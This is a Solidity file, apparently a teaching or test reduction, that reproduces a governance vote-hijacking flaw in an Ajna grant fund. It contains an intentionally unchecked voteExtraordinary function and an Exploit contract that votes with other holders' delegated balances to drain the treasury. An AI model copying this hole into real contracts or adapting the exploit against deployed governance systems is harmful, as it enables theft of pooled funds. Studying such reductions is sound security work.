// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Ajna — extraordinary proposal votes any delegated account (Trail of Bits)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: voteExtraordinary(account_, proposalId_) never checks
    account_ == msg.sender, so one caller can cast every delegated balance
    and execute a treasury transfer. Vulnerable line preserved verbatim (@> VULN). */

contract AjnaToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => uint256) public votes;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function delegate(address to) external {
        votes[to] += balanceOf[msg.sender];
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract Holder {
    function delegateSelf(AjnaToken token) external {
        token.delegate(address(this));
    }
}

contract GrantFund {
    AjnaToken public token;
    uint256 public totalVotes;
    uint256 public nextId;

    struct Proposal {
        uint256 votes;
        bool executed;
        address recipient;
        uint256 amount;
    }

    mapping(uint256 => Proposal) public proposals;
    mapping(uint256 => mapping(address => bool)) public hasVoted;

    constructor(AjnaToken token_) {
        token = token_;
    }

    function proposeExtraordinary(address recipient, uint256 amount) external returns (uint256 id) {
        id = nextId;
        nextId = id + 1;
        proposals[id].recipient = recipient;
        proposals[id].amount = amount;
    }

    function voteExtraordinary(address account_, uint256 proposalId_) external returns (uint256 votesCast_) {
        votesCast_ = _extraordinaryFundingVote(account_, proposalId_); // @> VULN: account_ is not msg.sender, so any caller votes for every delegate
        // FIX: replace account_ with msg.sender
    }

    function _extraordinaryFundingVote(address account_, uint256 proposalId_) internal returns (uint256 votesCast_) {
        require(!hasVoted[proposalId_][account_], "voted");
        hasVoted[proposalId_][account_] = true;
        votesCast_ = token.votes(account_);
        require(votesCast_ > 0, "no votes");
        proposals[proposalId_].votes += votesCast_; // S4
        totalVotes += votesCast_;
    }

    function executeExtraordinary(uint256 proposalId_) external {
        Proposal storage p = proposals[proposalId_];
        require(!p.executed, "executed");
        require(p.votes * 2 >= 100 ether, "threshold");
        p.executed = true;
        require(token.transfer(p.recipient, p.amount), "transfer");
    }
}

contract Exploit {
    AjnaToken public token; // nonce 1
    Holder public alice; // nonce 2
    Holder public bob; // nonce 3
    GrantFund public fund; // nonce 4 — vulnerable voteExtraordinary
    uint256 public constant STOLEN = 250_000_000 ether;
    uint256 public proposalId;

    constructor() {
        token = new AjnaToken();
        alice = new Holder();
        bob = new Holder();
        fund = new GrantFund(token);
        token.mint(address(alice), 60 ether);
        token.mint(address(bob), 40 ether);
        alice.delegateSelf(token);
        bob.delegateSelf(token);
        token.mint(address(fund), STOLEN);
    }

    function run() external {
        proposalId = fund.proposeExtraordinary(msg.sender, STOLEN); // S1
        fund.voteExtraordinary(address(alice), proposalId); // S2
        fund.voteExtraordinary(address(bob), proposalId);
        fund.executeExtraordinary(proposalId); // S5
        require(token.balanceOf(msg.sender) == STOLEN, "treasury not stolen"); // S6
        require(token.balanceOf(address(fund)) == 0, "treasury remains");
        require(msg.sender != address(alice) && msg.sender != address(bob), "holders voted themselves");
    }
}
